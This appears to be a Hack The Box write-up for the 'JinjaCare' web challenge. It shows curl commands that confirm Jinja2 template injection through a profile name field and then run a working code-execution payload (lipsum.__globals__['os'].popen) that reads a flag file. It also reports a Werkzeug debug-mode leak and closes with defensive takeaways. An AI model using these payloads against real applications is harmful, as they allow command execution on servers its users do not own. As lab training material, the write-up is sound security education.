# HTB — "JinjaCare" (Web)

**Category:** Web  
**Difficulty:** Very Easy

---

## Challenge Description

> JinjaCare is a web app for managing COVID-19 vaccination records, allowing users to view history and generate digital certificates. You're invited to identify security vulnerabilities in the system and retrieve the hidden flag from the application.

The challenge spawns a Docker instance exposed as an `IP:PORT` pair:

```text
154.57.164.68:31899
```

> The IP and port change every time the instance is respawned.

---

## Tooling

- `curl` — to send requests and interact with the API
- `pdfminer.six` (`pip install pdfminer.six`) — to extract text from the generated PDF certificate

---

## Recon: A COVID-19 Vaccination Portal

A first request shows a Flask/Werkzeug application styled as a healthcare platform, with the following routes visible in the navbar:

```text
/monitoring   COVID-19 Monitoring
/verify       Verify Certificate
/login        Sign In
```

The name **"JinjaCare"** is a direct hint: Jinja2 is Flask's templating engine, and the challenge is about injecting template expressions into user-controlled fields.

---

## Finding the Injection Point

### Step 1 — Register an account

The `/register` route accepts four fields: `name`, `email`, `password`, `confirmPassword`. A registration with valid data redirects to `/login`:

```bash
curl -s -c cook.txt -X POST http://154.57.164.68:31899/register \
  -d 'email=elodie@pwn.com&name=Elodie&password=password123&confirmPassword=password123'
```

### Step 2 — Log in and explore the dashboard

After logging in, the dashboard exposes three profile sub-pages and a certificate generator:

```text
/profile/personal      Personal Information (name, email, phone, address, DOB, gender...)
/profile/medical       Medical History
/profile/vaccinations  Vaccination Records
/generate_certificate  Generates a PDF vaccination certificate
```

The `/generate_certificate` route creates a PDF containing the user's personal information — especially their **name** — rendered server-side. This is the classic SSTI surface: a user-supplied value inserted into a Jinja2 template before being rendered into a document.

---

## Confirming SSTI

The `name` field in `/profile/personal` is updated via POST. Setting it to `{{7*7}}` and regenerating the certificate reveals whether the expression is evaluated:

```bash
curl -s -b cook.txt -c cook.txt -X POST http://154.57.164.68:31899/profile/personal \
  -d "name={{7*7}}&email=elodie@pwn.com&phone=0600000000&address=x \
      &dateOfBirth=2000-01-01&gender=female \
      &emergencyName=x&emergencyPhone=0600000000&relationship=x"

curl -s -b cook.txt http://154.57.164.68:31899/generate_certificate -o cert.pdf
python3 -c "from pdfminer.high_level import extract_text; print(extract_text('cert.pdf'))"
```

The PDF displays `Name: 49` — `7*7` was evaluated by Jinja2. SSTI is confirmed, with no filtering whatsoever.

---

## Exploiting SSTI — Reading the Flag

With SSTI confirmed and no input sanitization, the standard `lipsum.__globals__['os'].popen()` payload reads arbitrary files:

```bash
curl -s -b cook.txt -c cook.txt -X POST http://154.57.164.68:31899/profile/personal \
  --data-urlencode "name={{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}" \
  --data-urlencode "email=elodie@pwn.com" \
  --data-urlencode "phone=0600000000" \
  --data-urlencode "address=x" \
  --data-urlencode "dateOfBirth=2000-01-01" \
  --data-urlencode "gender=female" \
  --data-urlencode "emergencyName=x" \
  --data-urlencode "emergencyPhone=0600000000" \
  --data-urlencode "relationship=x"

curl -s -b cook.txt http://154.57.164.68:31899/generate_certificate -o cert_flag.pdf
python3 -c "from pdfminer.high_level import extract_text; print(extract_text('cert_flag.pdf'))"
```

The server evaluates the template expression, executes `cat /flag.txt` via `os.popen()`, and embeds the result in the PDF as the patient's name.

---

## The Flag

```text
HTB{REDACTED}
```

---

## Bonus — Werkzeug Debug Mode

During recon, sending malformed POST data to `/register` triggered the **Werkzeug interactive debugger**, leaking the application's source code at `/app/app.py` and an internal `SECRET` (`pRUN4aGVfcya2lrEdZZ4`) in the page source. While this didn't directly give code execution (the console requires a PIN and `EVALEX_TRUSTED = false` without JavaScript), it confirmed the app runs in debug mode — a critical misconfiguration in any production environment.

---

## Takeaways

- Any user-supplied value passed to `render_template_string()` or inserted into a Jinja2 template before rendering is a potential SSTI sink. Here the `name` field was stored in the database and later rendered into a PDF via a Jinja2 template with no escaping or sanitization.
- The `generate_certificate` feature is a particularly blind-looking vector: the output is a PDF, not HTML, so the injection is not visible in a browser. Always test document-generation features (PDF, DOCX, reports) for template injection — they are frequently overlooked.
- `--data-urlencode` is essential when sending payloads containing special characters like `{`, `'`, `/` through `curl`. Using `-d` raw causes shell quoting issues and the payload never reaches the server correctly.
- Running a production Flask app with `debug=True` is a critical misconfiguration. The Werkzeug debugger exposes the full source code, internal secrets, and (with the right PIN or JavaScript) an arbitrary Python code execution console.
- The flag's own text — `v3ry_e4sy_sst1_r1ght?` — confirms this is the intended path: a straightforward, unfiltered SSTI with no bypass required.
